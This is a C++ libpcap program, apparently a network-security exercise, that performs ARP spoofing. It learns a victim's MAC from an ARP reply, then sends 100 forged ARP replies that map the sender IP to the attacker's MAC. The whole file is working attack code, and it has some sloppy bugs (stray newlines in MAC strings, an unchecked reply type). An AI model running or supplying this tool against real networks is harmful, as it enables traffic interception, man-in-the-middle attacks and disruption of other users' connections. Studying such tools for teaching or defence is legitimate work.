#include "send-arp.h"


#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp eth0 192.169.0.1 192.168.0.2\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	unsigned char* tmp = getMyMac((unsigned char*)argv[1]);
	
	// get YourMac
	char myMacAddr[18] = {0,};

	sprintf(myMacAddr, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" \
    , tmp[0], tmp[1], tmp[2], tmp[3], tmp[4], tmp[5]);

	
	printf("%s", myMacAddr);

	Ip sender_IP = Ip(argv[2]);
	Ip target_IP = Ip(argv[3]);

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(myMacAddr);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(myMacAddr);
	packet.arp_.sip_ = htonl(sender_IP);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(target_IP);

	if(pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket))!=0){
		printf("Send Packet Error!\n");
		return -1;
	}
	
	struct pcap_pkthdr *header;
	u_char* pkt_data;
	int r;
	if (r = pcap_next_ex(handle, &header, (const u_char**)&pkt_data) > 0){
		EthArpPacket replyPacket;
		
		// typecast
		struct ether_header *eth_hdr = (struct ether_header *)pkt_data;
		ArpHdr *arp_hdr = (ArpHdr*)(pkt_data+14);
		
		char d_mac[18], s_mac[18];
		sprintf(d_mac, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" \
    	, eth_hdr->ether_dhost[0], eth_hdr->ether_dhost[1], eth_hdr->ether_dhost[2], eth_hdr->ether_dhost[3], eth_hdr->ether_dhost[4], eth_hdr->ether_dhost[5]);

		sprintf(s_mac, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" \
    	, eth_hdr->ether_shost[0], eth_hdr->ether_shost[1], eth_hdr->ether_shost[2], eth_hdr->ether_shost[3], eth_hdr->ether_shost[4], eth_hdr->ether_shost[5]);
	
		replyPacket.eth_.dmac_ = Mac(d_mac);
		replyPacket.eth_.smac_ = Mac(s_mac);
		replyPacket.eth_.type_ = eth_hdr->ether_type;

		if (replyPacket.eth_.type() != EthHdr::Arp){
			printf("Packet is not ARP\n");
			return -1;
		}
		
		// if arp packet is not reply, return
		// uint16_t* reply_op = (uint16_t*)(pkt_data+14+6);
		// if(ArpHdr::Reply != *reply_op){
		// 	printf("%d\n", *reply_op);
		// 	printf("arp packet is not reply\n");
		// 	return -1;
		// }
		// if arp packet's src_ip is not same as argv[3], return
		// uint8_t *tmp = (pkt_data+14+14);
		// char s_ip[16];
		// sprintf(s_ip, "%d.%.d.%.d.%.d", tmp[0], tmp[1], tmp[2], tmp[3]);
		// printf("%s\n", s_ip);
		
		//only get src_mac in arp_response
		char arp_src_mac[18];
		uint8_t* pArpMac = (pkt_data+14+8);
		sprintf(arp_src_mac, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" \
    	, pArpMac[0], pArpMac[1], pArpMac[2], pArpMac[3], pArpMac[4], pArpMac[5], pArpMac[6]);
		//printf("arp src mac %s\n", arp_src_mac);

		
		// send modified arp
		EthArpPacket modArpPkt;
		
		modArpPkt.eth_.dmac_ = Mac(arp_src_mac);
		modArpPkt.eth_.smac_ = Mac(myMacAddr);
		modArpPkt.eth_.type_ = htons(EthHdr::Arp);

		modArpPkt.arp_.hrd_ = htons(ArpHdr::ETHER);
		modArpPkt.arp_.pro_ = htons(EthHdr::Ip4);
		modArpPkt.arp_.hln_ = Mac::SIZE;
		modArpPkt.arp_.pln_ = Ip::SIZE;
		modArpPkt.arp_.op_ = htons(ArpHdr::Reply);
		modArpPkt.arp_.smac_ = Mac(myMacAddr);
		modArpPkt.arp_.sip_ = htonl(sender_IP);
		modArpPkt.arp_.tmac_ = Mac(arp_src_mac);
		modArpPkt.arp_.tip_ = htonl(target_IP);

		for(int i=0;i<100;i++){
			if(pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&modArpPkt), sizeof(EthArpPacket))!=0){
				printf("Send Packet Error!\n");
				return -1;
			}

			printf("Send modified arp...........%d\n", i+1);
			sleep(1);
		}
	}


	pcap_close(handle);
	

}
